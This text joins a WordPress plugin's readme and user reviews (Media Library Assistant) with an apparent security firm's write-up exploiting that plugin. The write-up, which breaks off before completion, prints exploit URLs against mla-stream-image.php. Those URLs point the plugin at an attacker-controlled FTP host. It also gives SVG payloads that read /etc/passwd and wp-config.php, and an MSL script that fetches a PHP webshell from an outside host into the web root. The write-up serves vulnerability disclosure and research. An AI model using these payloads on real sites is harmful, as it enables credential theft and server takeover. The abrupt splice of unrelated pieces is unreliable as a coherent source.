* The **`[mla_term_list]` shortcode**, used in a post, page, custom post type or widget to display hierarchical (and flat) taxonomy terms in list, dropdown control or checklist formats. **Twenty hooks** are provided for complete list customization from your theme or plugin code.
* The **`[mla_custom_list]` shortcode**, used in a post, page, custom post type or widget to display flat lists, dropdown controls and checkbox lists of custom field values. **Twenty-seven hooks** are provided for complete list customization from your theme or plugin code.
* Support for **[WPML](https://wpml.org/)** and **Polylang** multi-language CMS plugins. MLA has earned a place on [WPML’s List of Recommended Plugins](https://wpml.org/plugin/media-library-assistant/).
* **Integrates with Photonic Gallery, Justified Image Grid, Jetpack and other plugins**, so you can add slideshows, thumbnail strips and special effects to your `[mla_gallery]` galleries.
* Works with **[WordPress Real Media Library: Media Library Folder & File Manager](https://wordpress.org/plugins/real-media-library-lite/)** (Lite and Pro) to organize your files into folders, collections and galleries. This combination enhances both the Media/Assistant admin submenu and the `[mla_gallery]` shortcode.
* Works with **[CatFolders – WP Media Folders](https://wordpress.org/plugins/catfolders/)** (Lite and Pro) to categorize media files better and faster. This combination enhances both the Media/Assistant admin submenu and the `[mla_gallery]` shortcode.
* Powerful **Content Templates**, which let you compose a value from multiple data sources, mix literal text with data values, test for empty values and choose among two or more alternatives or suppress output entirely.
* **Attachment metadata** such as file size, image dimensions and where-used information can be assigned to WordPress custom fields. You can then use the custom fields in your `[mla_gallery]` display and you can add custom fields as sortable, searchable columns in the Media/Assistant submenu table. You can also **modify the WordPress `_wp_attachment_metadata` contents** to suit your needs.
* **IPTC**, **EXIF (including GPS)**, **XMP** and **PDF** metadata can be assigned to standard WordPress fields, taxonomy terms and custom fields. You can update all existing attachments from the Settings page IPTC/EXIF tab, groups of existing attachments with a Bulk Action or one existing attachment from the Edit Media/Edit Single Item screen. **Twelve hooks** provided for complete mapping customization from your theme or plugin code. You can view and/or download this PDF document with more information: [Mapping File Metadata to WordPress Fields with Media Library Assistant](http://davidlingren.com/assets/MLA-Metadata-Mapping.pdf)
* Complete control over **Post MIME Types, File Upload extensions/MIME Types and file type icon images**. Fifty four (54) additional upload types, 112 file type icon images and a searchable list of over 1,500 file extension/MIME type associations.
* **Enhanced Search Media box**. Search can be extended to the name/slug, ALT text and caption fields. The connector between search terms can be « and » or « or ». Search by attachment ID or Parent ID is supported, and you can search on keywords in the taxonomy terms assigned to Media Library items. Works in the Media Manager Modal Window, too.
* **Complete support for ALL taxonomies**, including the standard Categories and Tags, your custom taxonomies and the Assistant’s pre-defined Att. Categories and Att. Tags. You can add taxonomy columns to the Assistant listing, filter on any taxonomy, assign terms and list the attachments for a term.
* Taxonomy and custom field support in the ATTACHMENT DETAILS pane of the Media Manager Modal Window and Media/Library Grid view.
* Inline **« Bulk Edit »** and **« Quick Edit »** areas; update author, parent and custom fields, add, remove or replace taxonomy terms for several attachments at once. Works on the Media/Add New screen as well.
* Displays more attachment information such as parent information, file URL and image metadata. Provides many more listing columns (more than 20) to choose from.
* Provides additional view filters for MIME types and taxonomies, and features to cmpose custom views of your own.
* Works with the popular [Admin Columns](https://wordpress.org/plugins/codepress-admin-columns/) plugins for even more Media/Assistant screen customization.

The Assistant is designed to work like the standard Media Library pages, so the learning curve is short and gentle. Contextual help is provided on every new screen to highlight new features.

**NOTE:** Complete documentation is included in the Documentation tab on the Settings/Media Library Assistant admin screen and the drop-down « Help » content in the admin screens. You can find a stand-alone version of the Documentation on my web site: [Media Library Assistant Documentation](http://davidlingren.com/assets/mla-doc.html)

**I do not solicit nor accept personal donations in support of the plugin.** WordPress and its global community means a lot to me and I am happy to give something back.

If you find the Media Library Assistant plugin useful and would like to support a great cause, consider a [tax-deductible donation](http://secure.alsnetwork.org/goto/Chateau_Seaview_Fund) to our [Chateau Seaview Fund](http://secure.alsnetwork.org/goto/Chateau_Seaview_Fund) at the ALS Network. Every dollar of the fund goes to make the lives of people with ALS, their families and caregivers easier. Thank you!

#### The Example Plugins

The MLA example plugins have been developed to illustrate practical applications that use the hooks MLA provides to enhance the admin-mode screens and front-end content produced by the MLA shortcodes. Most of the examples are drawn from topics in the MLA Support Forum.

The Documentation/Example Plugins submenu lets you browse the list of MLA example plugins, install or update them in the Plugins/Installed Plugins area and see which examples you have already installed. To activate, deactivate or delete the plugins you must go to the Plugins/Installed Plugins admin submenu.

The Example plugins submenu lists all of the MLA example plugins and identifies those already in the Installed Plugins area. In the submenu:

* the « Screen Options » dropdown area lets you choose which columns to display and how many items appear on each page
* the « Help » dropdown area gives you a brief explanation of the submenu content and functions
* the « Search Plugins » text box lets you filter the display to items containing one or more keywords or phrases
* bulk and rollover actions are provided to install or update example plugins
* the table can be sorted by any of the displayed columns

Once you have installed an example plugin you can use the WordPress Plugins/Editor submenu to view the source code and (with extreme caution) make small changes to the code. **Be very careful if you choose to modify the code!** Making changes to active plugins is not recommended. If your changes cause a fatal error, the plugin will be automatically deactivated. It is much safer to download the file(s) or use FTP access to your site to modify the code offline in a more robust HTML/PHP editor.

You can use the « Download » rollover action to download a plugin to your local system. Once you have made your modifications you can copy the plugin to a compressed file (ZIP archive) and then upload it to your server with the Plugins/Add New (Upload Plugin) admin submenu.

If you do make changes to the example plugin code the best practice is to save the modified file(s) under a different name, so your changes won’t be lost in a future update. If you want to retain the file name, consider changing the version number, e.g. adding 100 to the MLA value, so you can more easily identify the plugins you have modified.

## FAQ

### How can I sort the Media/Assistant submenu table on values such as File Size?

You can add support for many attachment metadata values such as file size by visiting the Custom Fields tab on the Settings page. There you can define a rule that maps the data to a WordPress custom field and check the « MLA Column » box to make that field a sortable column in the Media/Assistant submenu table. You can also use the field in your `[mla_gallery]` shortcodes. For example, this shortcode displays a gallery of the ten largest images in the « general » category, with a custom caption:

```
[mla_gallery category="general" mla_caption="{+caption+}<br>{+custom:File Size+}" meta_key="File Size" orderby="meta_value" order="DESC" numberposts=10]

```

### How can I use Categories, Tags and custom taxonomies to select images for display in my posts and pages?

The powerful `[mla_gallery]` shortcode supports almost all of the query flexibility provided by the WP\_Query class. You can find complete documentation in the Settings/Media Library Assistant Documentation tab. A simple example is in the preceding question. Here’s an example that displays PDF documents with Att. Category « fauna » or Att. Tag « animal »:

```
[mla_gallery post_mime_type="application/pdf" size=icon mla_caption="{+title+}" tax_query="array(array('taxonomy'=>'attachment_category','field'=>'slug','terms'=>'fauna'),array('taxonomy'=>'attachment_tag','field'=>'slug','terms'=>'animal'),'relation'=>'OR')"]

```

### Can I use [mla\_gallery] for attachments other than images?

Yes! The `[mla_gallery]` shortcode supports all MIME types when you add the post\_mime\_type parameter to your query. You can build a gallery of your PDF documents, plain text files and other attachments. You can mix images and other MIME types in the same gallery, too. Here’s an example that displays a gallery of PDF documents, using Imagick and Ghostscript to show the first page of each document as a thumbnail:

```
[mla_gallery post_mime_type=application/pdf post_parent=all link=file mla_viewer=true columns=1 orderby=date order=desc]

```

### Can I attach an image to more than one post or page?

No; that’s a structural limitation of the WordPress database. However, you can use Categories, Tags and custom taxonomies to organize your images and associate them with posts and pages in any way you like. The `[mla_gallery]` shortcode makes it easy. You can also use the `ids=` parameter to compose a gallery from a list of specific images.

### Can the Assistant use the standard WordPress post Categories and Tags?

Yes! You can activate or deactivate support for Categories and Tags at any time by visiting the Media Library Assistant Settings page.

### Do I have to use the WordPress post Categories and Tags?

No! The Assistant supplies pre-defined Att. Categories and Att. Tags; these are WordPress custom taxonomies, with all of the API support that implies. You can activate or deactivate the pre-defined taxonomies at any time by visiting the Media Library Assistant Settings page.

### Can I add my own custom taxonomies to the Assistant?

Yes. Any custom taxonomy you register with the Attachment post type will appear in the Assistant UI. Use the Media Library Assistant Settings page to add support for your taxonomies to the Assistant UI.

### Can I use Jetpack Tiled Gallery or a lightbox plugin to display my gallery?

You can use other gallery-generating shortcodes to give you the data selection power of [mla\_gallery] and the formatting/display power of popular alternatives such as the WordPress.com Jetpack Carousel and Tiled Galleries modules. Any shortcode that accepts « ids= » or a similar parameter listing the attachment ID values for the gallery can be used. Here’s an example of a Jetpack Tiled gallery for everything except vegetables:

```
[mla_gallery attachment_category=vegetable tax_operator="NOT IN" mla_alt_shortcode=gallery type="rectangular"]

```

Most lightbox plugins use HTML `class=` and/or `rel=` tags to activate their features. `[mla_gallery]` lets you add this tag information to your gallery output. Here’s an example that opens PDF documents in a shadowbox using Easy Fancybox:

```
[mla_gallery post_mime_type=application/pdf post_parent=all link=file size=icon mla_caption='<a class="fancybox-iframe fancybox-pdf" href={+filelink_url+} target=_blank>{+title+}</a>' mla_link_attributes='class="fancybox-pdf fancybox-iframe"']

```

In the example, the `mla_caption=` parameter turns the document title into a link to the shadowbox display so you can click on the thumbnail image or the caption to activate the display.

### Why don’t the « Posts » counts in the taxonomy edit screens match the search results when you click on them?

This is a known WordPress problem with multiple support tickets already in Trac, e.g.,

Ticket #20708(closed defect (bug): duplicate) Wrong posts count in taxonomy table,

Ticket #14084(assigned defect (bug)) Custom taxonomy count includes draft & trashed posts,

and Ticket #14076(closed defect (bug): duplicate) Misleading post count on taxonomy screen.

For example, if you add Tags support to the Assistant and then assign tag values to your attachments, the « Posts » column in the « Tags » edit screen under the Posts admin section includes attachments in the count. If you click on the number in that column, only posts and pages are displayed. There are similar issues with custom post types and taxonomies (whether you use the Assistant or not). The « Attachments » column in the edit screens added by the Assistant shows the correct count because it works in a different way.

### How do I « unattach » an item?

Hover over the item you want to modify and click the « Edit » or « Quick Edit » action. Set the ID portion of the Parent Info field to zero (0), then click « Update » to record your changes. If you change your mind, click « Cancel » to return to the main page without recording any changes. You can also click the « Select » button to bring up a list of posts//pages and select one to be the new parent for the item. The « Set Parent » link in the Media/Assistant submenu table also supports changing the parent and unattaching an item.

### The Media/Assistant submenu seems sluggish; is there anything I can do to make it faster?

Some of the MLA features such as where-used reporting and ALT Text sorting/searching require a lot of database processing. If this is an issue for you, go to the Settings page and adjust the **« Where-used database access tuning »** settings. For any where-used category you can enable or disable processing. For the « Gallery in » and « MLA Gallery in » you can also choose to update the results on every page load or to cache the results for fifteen minutes between updates. The cache is also flushed automatically when posts, pages or attachments are inserted or updated.

### Do custom templates and option settings survive version upgrades?

Rest assured, custom templates and all of your option settings persist unchanged whenever you update to a new MLA version.

You can also back a backup of your templates and settings from the Settings/Media Library Assistant General tab. Scroll to the bottom of the page and click « Export ALL Settings » to create a backup file. You can create as many files as you like; they are date and time stamped so you can restore the one you want later.

In addition, you can deactivate and even delete the plugin without losing the settings. They will be there when you reinstall and activate in the future.

You can permanently delete the settings and (optionally) the backup files if you are removing MLA for good. The « Uninstall (Delete) » Plugin Settings section of the General tab enables these options.

### Are other language versions available?

Not many, but all of the internationalization work in the plugin source code has been completed and there is a Portable Object Template (.POT) available in the « /languages » directory. I don’t have working knowledge of anything but English, but if you’d like to volunteer to produce a translation, I would be delighted to work with you to make it happen. Have a look at the « MLA Internationalization Guide.pdf » file in the languages directory and get in touch.

### What’s in the « phpDocs » directory and do I need it?

All of the MLA source code has been annotated with « DocBlocks », a special type of comment used by phpDocumentor to generate API documentation. If you’d like a deeper understanding of the code, navigate to the [MLA phpDocs web page](http://davidlingren.com/assets/phpDocs/index.html "Read the API documentation") and have a look. Note that these pages require JavaScript for much of their functionality.

This plugin is absolute gem. I had been working with a team of photographers who were uploading car racing pictures on the fly. I needed to filter certain information to make it accessible to the press. While I don’t recall the specific details, I can certainly say this plugin was the solution I was looking for. There is a lot more under the hood of this plugin.

MLA is an extraordinarily powerful and rich plugin for media files. The documentation is extensive, and, perhaps most importantly, the developer, David Lingren, responds quickly, thoughtfully, and generously to requests for help or information. The plugin is a model of how software ought to be build; the threads on the support site are an example of what the internet is at its best.

As discussed in many of our articles, you already know that WordPress and related plugins are taking up a large space in the global attack surface we are monitoring for our customers.

Discovering always new methods and techniques to exploit potential flaws on these technologies allows us to be pro-active and try to maintain an advantage over potential attackers.

The vulnerability described below is a perfect example of that proactivity: we promptly alerted all our customers who were using the vulnerable plugins, even before the fix for the vulnerability became available (in most cases, our clients either disabled the plugin or implemented a custom fix provided by us).

## When You’re Lost in the Web

The first alert that raised our automatization was a confirmed Local File Inclusion (LFI) in a WordPress plugin called “Media Library Assistant” : <https://www.cvedetails.com/cve/CVE-2020-11732/>, the plugin has more than 70k active installation, not a bestseller but still interesting from an attacker perspective (to build a botnet, deploy ransomware...): <https://fr.wordpress.org/plugins/media-library-assistant/>

The plugin was indeed vulnerable regarding the version, but our automation was unable to go further (it has now been improved 😁).

In reality, Local File Inclusion vulnerabilities in WordPress are typically valuable for accessing critical files like `wp-config.php`. However, in the case of this specific vulnerability, it only works with an absolute path (as noted in the packetstorm exploit).

There is a file inclusion vulnerability in the mla-file-downloader.php file. Example:

```
http://server/wordpress/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=C:\Bitnami\wordpress-5.3.2-2\apps\wordpress\htdocs\wp-content\plugins\updraftplus\options.php
```

Patrowl automatization did not managed to identify a full path disclosure vulnerability elsewhere on the website, and all classic bruteforced path did not work.

This the moment chooses by our automatization to request a more in-depth investigation from a pentester.

The process is classic, and if you already read one of our articles, you likely familiar with the procedure: setting up a lab environment with the latest plugin version installed.
Originally, the plan was to identify in the plugin, a method that could trigger a full path disclosure and help the machine to go deeper in the exploitation. But we found a much more interesting and challenging vulnerability, bringing back old memories.

## Left Behind

The initial discovery (CVE-2020-11732) was targeting the `mla-file-downloader.php` file locate in the `includes` folder of the plugin directory.
A small stand-alone file now patched since a long time:

```
<?php
/**
 * Stand-alone file download handler for the [mla_gallery]
 *
 * @package Media Library Assistant
 * @since 2.32
 */

/*
 * Process [mla_gallery link=download] requests
 */
//@ini_set('error_log','C:\Program Files (x86)\Apache Software Foundation\Apache24\logs\php-errors.log');

require_once( pathinfo( __FILE__, PATHINFO_DIRNAME ) . '/class-mla-file-downloader.php' );

MLAFileDownloader::mla_process_download_file( array( 'error' => 'MLA File Downloader no longer supported because it allowed Local File Disclosure attacks.' ) );

// NO LONGER ALLOWED AS OF v2.82
if ( isset( $_REQUEST['mla_download_file'] ) && isset( $_REQUEST['mla_download_type'] ) ) {
    MLAFileDownloader::$mla_debug = isset( $_REQUEST['mla_debug'] ) && 'log' == $_REQUEST['mla_debug'];
    MLAFileDownloader::mla_process_download_file();
}

MLAFileDownloader::mla_die( 'MLA File Download parameters not set', __LINE__, 500 );
?>
```

The direct access to `mla-file-downloader.php` is now not allowed anymore. The first `require_once` is indeed now pointing to a file (class-mla-file-downloader.php) including the magic WordPress condition:

```
defined( 'ABSPATH' ) or die();
```

The condition disallows direct access to WordPress PHP files. So whatever we will do, the `die()` will systematically be called when reaching the `mla-file-downloader` directly. We had to look elsewhere.

The `Stand-alone` reference in the comment is quite interesting. Normally, stand-alone files are created to be reached directly, and with a little bit of luck, unauthenticated.

```
grep -ri "Stand-Alone" --include \*.php
./includes/mla-file-downloader.php: * Stand-alone file download handler for the [mla_gallery]
./includes/mla-stream-image.php: * Stand-alone stream image handler for the mla_viewer
./includes/class-mla-shortcode-support.php:                      * found by the stand-alone (no WordPress) image stream processor.
./examples/plugins/smart-media-categories/admin/includes/class-smc-automatic-support.php:               // Check for stand-alone terms update, i.e., not part of an insert/update post event
```

The second one seems juicy: `mla-stream-image.php`, let’s have a look.

## Infected

The file has the same structure as the first one and is very easy to understand:

```
<?php
/**
 * Stand-alone stream image handler for the mla_viewer
 *
 * @package Media Library Assistant
 * @since 2.10
 */

/*
 * Process mla_viewer image stream requests
 */
//@ini_set('error_log','C:\Program Files\Apache Software Foundation\Apache24\logs\php-errors.log');

require_once( pathinfo( __FILE__, PATHINFO_DIRNAME ) . '/class-mla-image-processor.php' );

if ( isset( $_REQUEST['mla_stream_file'] ) ) {
    MLAImageProcessor::$mla_debug = isset( $_REQUEST['mla_debug'] ) && 'log' == $_REQUEST['mla_debug'];
    MLAImageProcessor::mla_process_stream_image();
}

MLAImageProcessor::_mla_die( 'mla_stream_file not set', __LINE__, 500 );
?>
```

But this time, the `class-mla-image-processor.php` is not protected from direct access:

Which indicates that we could reach the function `MLAImageProcessor::mla_process_stream_image()` with an unauthenticated controlled parameter : `$_REQUEST['mla_stream_file']`

The `mla_process_stream_image` is aptly named; it is used to generate thumbnails for local PDF. The function then first check if the file exists locally:

```
$
file = isset( $_REQUEST['mla_stream_file'] ) ? $_REQUEST['mla_stream_file'] : ''; // phpcs:ignore
if ( ! is_file( $file ) ) {
self::_mla_die( 'File not found', __LINE__, 404 );
}
```

If the file exists, it is then passed to the `_ghostscript_convert` function.

Other parameters used for conversion are also within the user's control. But all of them are strongly typed to int or even rewrite, which does not give us a large flexibility in our exploitation path:

```
$use_mutex = isset( $_REQUEST['mla_single_thread'] );
$width = isset( $_REQUEST['mla_stream_width'] ) ? abs( (int) $_REQUEST['mla_stream_width'] ) : 0;
$height = isset( $_REQUEST['mla_stream_height'] ) ? abs( (int) $_REQUEST['mla_stream_height'] ) : 0;
$type = isset( $_REQUEST['mla_stream_type'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['mla_stream_type'] ) ) : 'image/webp';
$quality = isset( $_REQUEST['mla_stream_quality'] ) ? abs( (int) $_REQUEST['mla_stream_quality'] ) : 0;
$frame = isset( $_REQUEST['mla_stream_frame'] ) ? abs( (int) $_REQUEST['mla_stream_frame'] ) : 0;
$resolution = isset( $_REQUEST['mla_stream_resolution'] ) ? abs( (int) $_REQUEST['mla_stream_resolution'] ) : 72;

$ghostscript_path = isset( $_REQUEST['mla_ghostscript_path'] ) ? $_REQUEST['mla_ghostscript_path'] : ''; // phpcs:ignore
if ( ! empty( $ghostscript_path ) ) {
        $ghostscript_path = @file_get_contents( dirname( __FILE__ ) . '/' . 'mla-ghostscript-path.txt' );

$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );
```

The \_ ghostscript\_convert function is a little bit complicated and we did not find any exploitation path from here. It basically searches for the ghostscript executable and execute the appropriate “gs” command line, but with appropriate protection:

```
$cmd = escapeshellarg( $ghostscript_path ) . ' -sDEVICE=%1$s -r%2$dx%2$d -dFirstPage=%3$d -dLastPage=%3$d -dFitPage -o %4$s %5$s 2>&1';
```

If it succeeded, we get then a webp file (type set by default and cannot be changed) of our controlled path.

If the ghostscript\_convert fail, a backup plan is used with Imagick() library:

```
$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );

if ( false === $result ) {
try {
self::$image->readImage( $file . '[' . $frame . ']' );
}
catch ( Exception $e ) {
self::$image->readImage( $file . '[0]' );
 }
```

So, from that, we managed to generate webp extract of PDF or image files located somewhere in the WordPress, ex:
and...

Alright, that's interesting but clearly unexploitable. It might enable us to potentially access specific PDFs stored outside the WordPress Web Directory, but this would require knowing the exact paths to those PDFs (whether absolute or relative), To make it work, you'd have to combine it with another exploit.

Every other format (PHP) will raise an error as the format is not understood either by ghostccript and Imagick. The conversion will then not work, here is an extract of logs when we try to convert a PHP file to webp.

```
wordpress-local-wordpress-1  | [Fri Aug 25 14:49:36.458816 2023] [php:notice] [pid 32] [client 172.19.0.1:58574] 297 _mla_die( 'Image load exception: no decode delegate for this image format `PHP' @ error/constitute.c/ReadImage/575', '537', '404' )
```

As we hate fake unexploitable CVE, and as we love to say in French at Patrowl, let’s “Faire des efforts” (*Make serious efforts*).

## Look for the Imagick

Clearly, since the beginning, our secret goal is to reach the `Imagick()` function with a controlled file. We all know since a long that a misconfigured Imagick library is a goldmine for attackers, and you can find numerous very interesting papers or write-up exploiting the library (see References).
But, to do so, we need to have the `is_file()` used at the beginning of the function to return `True`. The first scenario would be to have a file upload functionality on the WordPress (maybe another plugin), find the uploaded path and use the local controlled file to play with Imagick library.

But no sign of file upload functionality for our WordPress, we had to find another way.

Our immediate though has been to use https:// or http:// remote protocol on the `is_file()` function but with no luck. Looking the documentation, we have a great “tip” given by PHP: <https://www.php.net/manual/en/function.is-file.php>

`is_file` is then working with all wrapper supporting the `stat()` family of functionality. http:// and https://, indeed, do not support `stat()` functionality.

But hello kiddo:

Quick local check, putting an existing arbitrary file on an open FTP server:

```
root@141e013356ca:/var/www/html# php -r "echo(is_file('ftp://X.X.X.X.:2122/test_is_file.txt'));"
1
```

In our remote server:

```
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] CWD /root/test_ftp/test_is_file.txt 550 'Not a directory.'
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] FTP session closed (disconnect).
```

Awesome!
Now we can use a remote file within the `ghostcript` or `Imagick()` function. The second one is of course much more interesting. Testing with a valid remote controlled FTP hosted image on the plugin gives us:

<http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/test_is_file.txt&mla_debug=log>

```
[I 2023-08-25 15:24:42] X.X.X.X.48:52847-[anonymous] FTP session closed (disconnect).
[I 2023-08-25 15:24:42] X.X.X.X:52849-[Patrowl] FTP session opened (connect)
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] RETR /root/test_ftp/test_is_file.txt[0] completed=1 bytes=0 seconds=0.0
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] FTP session closed (disconnect).
```

Bingo, we have the connection from our Wordpress to our FTP. The file asked is `test_is_file.txt[0]`. This is good sign as the `[0]` typically indicates the frame to be converted by Imagick.

Quick look on the logs, we see that the `ghoscript` function will systematically fail when used with an ftp:// filename as input.

We then have what we were looking for: an external controlled image converted by the Imagick() library. We just have to setup 2 files on our ftp server:

* `malicious_file.webp` that could be empty, just to bypass the is\_file() check,
* `malicious_file.webp[0]` which will be converted by Imagick.

Let’s have some fun.

## Endure and Survive

Now, let’s play a little with Imagick library. First, to clarify our speech, Imagick is the PHP library of ImageMagick software. Exploitation path on both software and PHP library are globally the same as the PHP library will use exported C Function of the Software.

Our previous exploits and all existing technical exploitation papers all point to a common conclusion: ImageMagick is an excellent tool for image rendering, but it must be configured with rigorous security policies. Developers of Imagick have had to patch numerous CVEs across thousands of plugins, and they are now quite clear about their stance on vulnerabilities:

“Before you post a vulnerability, first determine if the vulnerability can be mitigated by the security policy. ImageMagick, by default, is open. Use the security policy to add constraints to meet the requirements of your local security governance. »

Now, this becomes intriguing for us. Why? Well, consider this: out of the 70,000 plugins installed, how many developers or system operators are aware that one of their plugins is utilizing Imagick (the PHP library for ImageMagick) with a default open security policy?

A basic installation of the plugins (with Imagick libraries installed on the server) came with this default security policy:

```
<policymap>
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="map" value="512MiB"/>
  <policy domain="resource" name="width" value="16KP"/>
  <policy domain="resource" name="height" value="16KP"/>
  <policy domain="resource" name="area" value="128MP"/>
  <policy domain="resource" name="disk" value="1GiB"/>
  <policy domain="delegate" rights="none" pattern="URL" />
  <policy domain="delegate" rights="none" pattern="HTTPS" />
  <policy domain="delegate" rights="none" pattern="HTTP" />
  <policy domain="path" rights="none" pattern="@*"/>
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PS2" />
  <policy domain="coder" rights="none" pattern="PS3" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />
</policymap>
```

We can see that some “dangerous” formats are disabled by default like PS or XPS. We could think HTTPs and HTTP patterns are also not allowed by default, but the policy seems to be just here to force Curl internal usage and using http external resource on Imagick() conversion works like a charm with this config.

Now we know that on every instance with the plugins effectively working with a default Imagick configuration, we will be able to use external SVG. Why SVG? let's explore how ImageMagick functions a bit more.

## Please hold to my SVG

All ImageMagick exploits work basically the same. The idea is to force Imagick to use its own internal scripting format called MSL. The MSL format allows to move or create file within the file server.

We can for example, move a remote PHP webshell file within the WordPress directory, where virus.webp just a polyglot webp file with PHP in it.

```
<image>
  <read filename="http://x.x.x.x/8081/virus.webp" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
</image>
```

But triggering Imagick MSL parsing is not that easy anymore. When using the PHP Imagick library on images, a first called is made to the `identity` function. Identify will read the image, search for Magic Byte or specific string within the file. The result of the function will then be used as Imagick Parser.

But since Imagetragick, parser will explicitly not recognize dangerous scripting file such as MSL, when you try to parse a MSL file, Imagick will either considered it as SVG or say the format is not recognized.

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("/var/www/html/test.msl");'
Fatal error: Uncaught ImagickException: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575 in Command line code:1
```

The only way to get MSL understood by Imagick is to specify the file format before the file using what we will call a `formatter`:

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("msl:/var/www/html/test.msl");'
Aborded
```

In our exploit, the controlled path will failed the `is_file()` check if we force the `msl:` formatter within our filename, we have to find another way.
SVG came quickly to our minds. SVG is built to use external files and references. When the Imagick default SVG parser is used, the file is converted in MVG format (Magick Vector Graphics Metafiles). `image` tags with specific inner tags such as `xlink:href` or `path` are transformed into the MVG instruction:

```
image Over %g,%g %g,%g \"%s\"\n »
```

<https://github.com/ImageMagick/ImageMagick/blob/main/coders/svg.c>

From here:

```
if (LocaleCompare((const char *) name,"image") == 0)
        {
          (void) FormatLocaleFile(svg_info->file,
            "image Over %g,%g %g,%g \"%s\"\n",svg_info->bounds.x,
            svg_info->bounds.y,svg_info->bounds.width,svg_info->bounds.height,
            svg_info->url);
          (void) FormatLocaleFile(svg_info->file,"pop graphic-context\n");
          break;
        }
```

Then, the MVG parsing (<https://github.com/ImageMagick/ImageMagick/blob/main/coders/mvg.c-> /) wil finally call the `DrawImage()` function : <https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/draw.c#L4512>

Which will integrate the `image` MVG in our new image using the ImageMagick `compose` function:

```
if (LocaleCompare("image",keyword) == 0)
          {
            ssize_t
              compose;

            primitive_type=ImagePrimitive;
            (void) GetNextToken(q,&q,extent,token);
            compose=ParseCommandOption(MagickComposeOptions,MagickFalse,token);
            if (compose == -1)
              {
                status=MagickFalse;
                break;
              }
            graphic_context[n]->compose=(CompositeOperator) compose;
```

`Compose` is a specific command from ImageMagick, it allows to combine multiple images, the “Over” parameter used in the SVG parser is just one of the dozen options available for composite ImageMagick <https://imagemagick.org/Usage/compose/#over>

The usage of composite function is then crucial to understand the exploitation. As it used for overlaying or combining multiple images, the function needs to understand specific ImageMagick commands.

Example, if you want to Over a specific text on image you can simply use composite with `text:/path/to/text.txt` and Imagemagick will automatically Over the text on your first image.

```
$composite patrowl.webp text:./patrowl.txt patrowl_over.webp
```

Will add the text of patrowl.txt on the patrowl.webp image.

Now, with a simple SVG, we can control defined ImageMagick formatters, such as MSL, but also all other formatters enabled by default.

## When we are in Need

The first analyses quickly lead us to a smooth LFI. The plugin directly returns the output of Imagick convert function as an http response:

```
// Stream the image back to the requestor
        try {
            header( "Content-Type: $type" );
            echo self::$image->getImageBlob();
```

Then, by using a SVG with a `text:` formatter in it, we can create a blank image on which we will Over as a result the content of the file we want on the file server, we just need to adjust the width and heigh so that we can have something we can read:

Lfi.sfg[0] on remote FTP server:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:/etc/passwd" width="500" height="500" />
</svg>
```

Exploitation:

```
http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/lfi.svg&mla_debug=log&mla_stream_height=500&mla_stream_width=600
```

Now, we have a nice LFI, from here we can reach and print all WordPress PHP file we want, as the plugin will always be installed in the same directory, the relative path will always be the same.

We just need to adjust the page we want by setting the `mla_stream_frame` to 1 (and don’t forget to have the related `lfi.svg\[1\]` on the remote FTP).

Lfi.svg[1]:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:../../../../wp-config.php" width="500" height="500" />
</svg>
```

Great, now we can potentially takeover the WordPress (depending on the configuration). But we are so closed to an RCE, we cannot stop here.

## Long, Long Time

To achieve our RCE, we now need a MSL file on the fileserver. Indeed, the msl: formatter does not accept remote file (`msl://http://x.x.x.x` will never work).

The technic used by Synacktiv in their article is using PDF conversion with embed PostScript to write the MSL file within the /tmp folder. Unfortunately, it will not work here since this format are disabled by default on our instance.

After spending hours playing with different format and trying to find one that could create a MSL file within a controlled directory, we discovered during all our tests that hundreds of files have been created in our docker instance within the /tmp folder with the nomenclature: /tmp/magick-\*

Many of them were the MVG converted file from our SVG payloads, but also, the first SVG payload download from our FTP server.

The fact that some files are not deleted by the Imagick process within the /tmp folder still a mystery. We have few clues on self-calling SVG file that could cause segfault and the file not to be deleted: <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j96m-mjp6-99xr>

But not exploitable in our configuration as the file came from an external source, it cannot be self-calling.
Taking a closer look, we discovered that for each SVG converted, we have 3 files created in /tmp folder, all using magick-XXX nomenclature (where XXX is a 32-char random string):

* One 0byte file
* One file is the SVG we are converting
* One file is the MVG transition format from Imagick

Note that the location of the /tmp folder used by Imagick could be configured within the policy.xml file. But now that you have LFI, you can quickly spot it if it has been changed.

Then, once the conversion is finished, the 0byte files is not deleted (it will be annoying later you will see) but 2 others are.

Our exploitation idea is then to use 2 files:

* One that will trigger the copy of the file within the /tmp folder during the conversion with MSL scripts in it
* The other, a SVG file, that includes a xlink reference with a msl: forced formatter pointing to the first file created in the /tmp folder.

The idea is good (of course), but requires multiple bypass:

1. To trigger the creation of the temporary file in the /tmp folder, the initial file needs to be a valid format (MSL or Text is not a valid or recognized format).
2. The file is instantly deleted after each conversion
